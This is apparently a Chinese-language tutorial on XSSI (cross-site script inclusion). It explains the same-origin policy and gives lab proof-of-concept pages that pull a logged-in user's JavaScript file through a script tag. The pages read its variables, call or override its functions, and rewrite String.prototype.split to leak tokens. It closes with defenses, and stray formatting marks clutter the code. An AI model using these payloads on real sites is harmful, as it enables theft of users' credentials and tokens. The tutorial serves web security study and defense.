  

## ****简介****

 ** **XSSI（Cross Site Script Inclusion）跨站脚本包含****
是一种允许攻击者通过嵌入script标签的src属性来加载敏感js绕过边界窃取信息的漏洞。

简单来讲，就是 ** **攻击者通过使用**** ** **< script>**** **
**标签跨域包含特定文件/页面，就可以窃取符合JavaScript格式的文件中的敏感信息。****

举例如下：

#!javascript  
<!-- attacker's page loads external data with SCRIPT tag -->  
 ** **< SCRIPT**** ** **src**** ="http://target.wooyun.org/secret" ** **>
</SCRIPT>****

##  ** **原理****

先来简单了解下什么是同源策略：

同源策略SOP（Same origin
policy）是一种约定，也是浏览器最核心也最基本的安全功能，它限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。

如果两个 URL 的 [protocol](https://developer.mozilla.org/zh-CN/docs/Glossary/Protocol)、[port](https://developer.mozilla.org/en-US/docs/Glossary/Port)(如果有指定的话)和 [host](https://developer.mozilla.org/zh-CN/docs/Glossary/Host)都相同的话，则这两个 URL 是 ** **同源**** 。这个方案也被称为“协议/主机/端口元组”，或者直接是
“元组”。（“元组” 是指一组项目构成的整体，双重/三重/四重/五重/等的通用形式）。

下表给出了与 URL http://store.company.com/dir/page.html 的源进行对比的示例:

URL

|

结果

|

原因  
  
---|---|---  
  
http://store.company.com/dir2/other.html

|

同源

|

只有路径不同  
  
http://store.company.com/dir/inner/another.html

|

同源

|

只有路径不同  
  
https://store.company.com/secure.html

|

失败

|

协议不同  
  
http://store.company.com:81/dir/etc.html

|

失败

|

端口不同 ( http:// 默认端口是80)  
  
http://news.company.com/dir/other.html

|

失败

|

主机不同  
  
而XSSI的核心就是绕过了SOP来跨域包含含有敏感信息的外域文件，因为默认情况下不允许加载外域文件，而通过script标签是允许跨域加载资源的，如果某个网站的动态JS脚本、文件和响应中包含某些敏感信息，那么就存在信息泄漏的风险。

与其说是绕过SOP，个人感觉更像是利用了script标签的跨域特性。。。

##  ** **利用场景****

用户登录正常的网站A，网站A会给用户分配Cookie用于鉴权

用户访问攻击者构造的恶意页面B，页面包含有script标签，且src属性为网站A中含有敏感信息的JS文件或者特定页面（返回类型必须能被script识别解析）

攻击者可以从下载的动态JS文件中获取用户的敏感信息

![1649215392_624d07a02c5ec4d2914aa.png!small?1649215392903](https://image.3001.net/images/20220406/1649215392_624d07a02c5ec4d2914aa.png!small?1649215392903)

##  ** **攻击利用****

因为XSSI主要是通过script标签加载目标的敏感文件，再从敏感文件中获取信息；而敏感文件主要分为两类，分别是：

  * JavaScript文件
    * 静态JS文件（需要登陆后才能访问的，不然可以直接访问，没意义）
    * 动态JS文件
  * 非JavaScript文件（比较鸡肋）
    * CSV文件
    * JSON文件

###  ** **针对JavaScript文件****

####  ** **静态JavaScript文件****

这里遇到的情况相对较少，因为静态的JavaScript文件不登陆的情况下大多都是可以访问的，很少出现必须要登录才能访问的情况；如果不登陆的情况下都可以访问，那用了XSSI反而是多此一举。

  * 敏感JS文件
  *  ** **var**** username = "admin";  
 ** **var**** password =
"admin888";![1649215413_624d07b5391a1c0105b31.png!small?1649215413463](https://image.3001.net/images/20220406/1649215413_624d07b5391a1c0105b31.png!small?1649215413463)  

  * XSSI利用代码
  *  ** **< title>****d4m1ts ** **< /title>****  
 ** **< script**** ** **src****
="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js" ** **> </script>****  
 ** **< script**** ** **src**** ="http://127.0.0.1:8000/info.js" ** **>
</script>****  
 ** **< script****type="text/javascript" ** **>****  
document.write("用户名：" + username);  
document.write("</br>");  
document.write("密码 ：" + password);  
 ** **<
/script>![1649215434_624d07caaf025cf202411.png!small?1649215435090](https://image.3001.net/images/20220406/1649215434_624d07caaf025cf202411.png!small?1649215435090)****

####  ** **动态JavaScript文件****

这种情况就比较多了，一般都是需要登陆后才能访问的，且通常包含有敏感信息，适合用来进行XSSI攻击

##### 插曲

Q：如何判断一个JS是不是动态的

A1：用多个账号分别访问这个JS，看看返回的内容是不是一样的

A2：使用burp插件：[DetectDynamicJS](https://github.com/luh2/DetectDynamicJS)

##### 直接调用相关函数

  * 敏感动态JS（动态生成token）
  *  ** **function**** getToken(){  
len = 16 || 32;  
 ** **var**** $chars =
'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678';  
 ** **var**** maxPos = $chars.length;  
 ** **var**** token = '';  
 ** **for**** (i = 0; i < len; i++) {  
token += $chars.charAt(Math.floor(Math.random() * maxPos));  
}  
 ** **return**** token;  
}

  * XSSI利用代码（直接调用getToken()函数）
  *  ** **< title>****d4m1ts ** **< /title>****  
 ** **< script**** ** **src****
="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js" ** **> </script>****  
 ** **< script**** ** **src**** ="http://127.0.0.1:8000/info.js" ** **>
</script>****  
 ** **< script****type="text/javascript" ** **>****  
 ** **var**** token = getToken();  
document.write("Token is : " + token);  
 ** **<
/script>![1649215531_624d082bd64dc9d98de67.png!small?1649215532125](https://image.3001.net/images/20220406/1649215531_624d082bd64dc9d98de67.png!small?1649215532125)****

##### 重写调用函数

  * 敏感动态JS
  * ( ** **function**** (){  
 ** **var**** token = getToken();  
doSomeThing(token);  
})();  
  
 ** **function**** getToken(){  
len = 16 || 32;  
 ** **var**** $chars =
'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678';  
 ** **var**** maxPos = $chars.length;  
 ** **var**** token = '';  
 ** **for**** (i = 0; i < len; i++) {  
token += $chars.charAt(Math.floor(Math.random() * maxPos));  
}  
 ** **return**** token;  
}

  * XSSI利用代码（重写doSomeThing(token)方法）
  *  ** **< title>****d4m1ts ** **< /title>****  
  
 ** **< script****type="text/javascript" ** **>****  
 ** **function**** doSomeThing(token){  
document.write("Token: " + token);  
}  
 ** **< /script>****  
 ** **< script**** ** **src****
="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js" ** **> </script>****  
 ** **< script**** ** **src**** ="http://127.0.0.1:8000/info.js" ** **>
</script>![1649215539_624d0833b36ba3545b41f.png!small?1649215539979](https://image.3001.net/images/20220406/1649215539_624d0833b36ba3545b41f.png!small?1649215539979)****  

##### 重写原型链

如果调用敏感数据的函数是内置的方法，比如String类型的内置方法split()、trim()、search()等，这些函数肯定是不能被直接重写的，但是我们可以通过重写原型链的方法来重写对应的内置函数。（还是重写方法。。。）

  * 敏感动态JS
  * ( ** **function**** (){  
 ** **var**** token = getToken();  
token.split("");  
})();  
  
 ** **function**** getToken(){  
len = 16 || 32;  
 ** **var**** $chars =
'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678';  
 ** **var**** maxPos = $chars.length;  
 ** **var**** token = '';  
 ** **for**** (i = 0; i < len; i++) {  
token += $chars.charAt(Math.floor(Math.random() * maxPos));  
}  
 ** **return**** token;  
}

  * XSSI利用代码（重写String原型链中的split()方法）
  *  ** **< title>****d4m1ts ** **< /title>****  
  
 ** **< script****type="text/javascript" ** **>****  
String.prototype.split = ****function**** (){  
document.write( ** **this****.toString());  
}  
 ** **< /script>****  
 ** **< script**** ** **src****
="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js" ** **> </script>****  
 ** **< script**** ** **src**** ="http://127.0.0.1:8000/info.js" ** **>
</script>****![1649215556_624d0844ba7f374e5d1ca.png!small?1649215556962](https://image.3001.net/images/20220406/1649215556_624d0844ba7f374e5d1ca.png!small?1649215556962)  

###  ** **针对非JavaScript类型文件****

主要是利用IE的各种bug问题，而现在几乎很少有人使用IE了，算是比较鸡肋吧。。。

在chrome和firefox中已经不存在这个问题了

具体原因如下：

![1649215569_624d08513ba9afe0d16af.png!small?1649215569486](https://image.3001.net/images/20220406/1649215569_624d08513ba9afe0d16af.png!small?1649215569486)

有兴趣可以参考：[XSSI攻击利用 -大学生](https://wooyun.js.org/drops/XSSI%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8.html)，原理也很简单

##  ** **XSSI与XSS、CSRF、XS-Leak的区别****

相同点：四者均为Web前端安全漏洞，都需要用户交互才能触发。

不同点：

  * XSS是在受害者html页面中注入恶意代码执行恶意操作，例如窃取已登录用户的cookie信息；
  * CSRF是通过诱使受害者访问恶意页面导致向目标页面发起请求，在受害者已登录的目标页面中执行恶意动作，例如提交修改用户密码的表单操作；
  * XS-Leaks是用于具有模糊查询的功能，请求结果只会返回两种有差异的结果，然后根据这些差异推断出用户的敏感信息；
  * XSSI是通过script标签的src属性来跨域包含含有敏感数据的文件来窃取敏感信息的；

##  ** **防御****

开发者永远也不要把敏感数据放在JavaScript文件中， 也不要放在JSONP中；

请求敏感文件/响应的尽量改为POST方式；

使用类似于CSRF-Token机制；

设置响应头为X-Content-Type-Options: nosniff，此时浏览器就会拒绝加载JS类型的数据；

##  ** **参考****

  * [浅析XSSI漏洞](https://www.mi1k7ea.com/2020/01/04/%E6%B5%85%E6%9E%90XSSI%E6%BC%8F%E6%B4%9E/)
  * [Web安全之XSSI漏洞](https://ultramangaia.github.io/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXSSI%E6%BC%8F%E6%B4%9E.html)

  

